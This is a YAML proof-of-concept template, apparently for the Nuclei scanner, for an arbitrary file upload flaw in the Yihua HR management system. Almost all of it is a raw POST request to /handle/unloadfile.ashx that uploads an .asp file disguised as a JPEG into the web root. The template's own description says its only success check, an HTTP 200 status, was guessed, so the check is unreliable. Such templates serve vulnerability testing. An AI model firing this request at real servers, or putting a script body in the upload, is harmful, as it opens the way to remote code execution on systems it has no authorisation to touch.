id: poc-kbv8xd6h0ngrz94h
info:
  name: 亿华人力资源管理系统unloadfile存在任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2024
http:
- raw:
  - 'POST /handle/unloadfile.ashx HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0

    Accept: application/json, text/javascript, */*; q=0.01

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

    X-Requested-With: XMLHttpRequest

    Content-Type: multipart/form-data; boundary=---------------------------21909179191068471382830692394

    Sec-Fetch-Dest: empty

    Sec-Fetch-Mode: cors

    Sec-Fetch-Site: same-origin


    -----------------------------21909179191068471382830692394

    Content-Disposition: form-data; name="file"; filename="stc.asp"

    Content-Type: image/jpeg


    test

    -----------------------------21909179191068471382830692394

    Content-Disposition: form-data; name="action"


    unloadfile

    -----------------------------21909179191068471382830692394

    Content-Disposition: form-data; name="filepath"


    ./

    -----------------------------21909179191068471382830692394—'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
